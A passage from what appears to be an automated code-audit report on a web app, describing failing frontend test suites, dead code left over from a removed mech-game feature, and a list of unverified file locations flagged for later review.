_Failure:_ `vitest run` in frontend/ exits failing: (1) ApiDocsPage.test.ts:29 `mount((await import(...)).default ...)` inside `it('renders the iframe element', () => {...})` is an esbuild transform error, so that whole suite never executes; (2) useQuote tests expect error.value='Failed to load quote' on repo rejection and a bare 'Test quote', but the implementation (composables/useQuote.ts:35-53) uses Promise.allSettled with fallback quotes and always appends '\n\n💡 <advice>', so the error path asserted is unreachable; (3) CountdownPage has 2 rendering assertions failing. CI running the test script is permanently red, masking new regressions.

### frontend/composables/useGameSettings.ts:104  ·  dead-code  ·  (3/3, main-site)
**Mech-tree deletion leftovers mislead: useGameSettings ('mech-game-settings') has zero consumers, and MainApp.vue/useSwipeGestures still special-case route names 'mech-builder'/'mech-battle' that can never render in the SPA (their beforeEnter cancels navigation)**

_Failure:_ useGameSettings.ts (audio/graphics/controls persistence for the deleted in-app mech game) is imported by nothing — a developer maintaining game settings edits it with no effect on the live game (the mech app has its own copy under apps/mech). MainApp.vue:103 `route.name === 'mech-builder' || route.name === 'mech-battle'` (fullscreen-route check) is dead: those routes only exist as handoff records whose beforeEnter returns false and does location.assign, so the SPA never renders them. useSwipeGestures.ts:69-70 keeps 'mech-builder'/'mech-battle' in the swipe routeOrder, so with swipe nav enabled, swiping past 'solar-battery' triggers a full-page exit from the SPA into the mech app instead of a normal in-app page change.


## Unverified — credits ran out before their panels ran

These are raw finder claims (infra/deploy dimension + stragglers). Treat as leads, not confirmed:

- `shop.controller.ts:344`
- `archive.controller.ts:26`
- `patch-notes.controller.ts:24`
- `schema.prisma:375`
- `seed.ts:3`
- `useMechBuilder.ts:441`
- `useSettingsPersistence.ts:53`
- `fart-service.ts:99`
- `test_prisma.ts:1`
- `dev.sh:5`
- `dev.sh:26`
- `backup-postgres.sh:31`
- `mech-server.ts:27`
- `deploy.sh:50`
- `deploy.sh:57`
- `deploy.sh:41`
- `push-and-deploy.sh:7`
- `Dockerfile:151`
- `docker-compose.yml:70`